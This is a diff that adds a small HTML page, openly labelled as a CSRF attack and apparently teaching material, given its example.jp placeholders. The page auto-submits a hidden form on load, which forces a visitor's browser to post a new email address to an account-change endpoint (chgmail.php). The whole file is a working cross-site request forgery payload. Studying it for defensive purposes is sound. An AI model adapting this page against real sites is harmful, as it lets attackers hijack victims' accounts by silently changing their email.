@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+    <title>csrf</title>
+  </head>
+  <body onload="document.attackform.submit();">
+    <h1>CSRF!</h1>
+    <form name="attackform" method="post" action="https://example.jp/chgmail.php">
+        <input type="hidden" name="mail" value="hoge@example.jp">
+        <input type="submit" value="送信">
+    </form>
+  </body>
+</html>
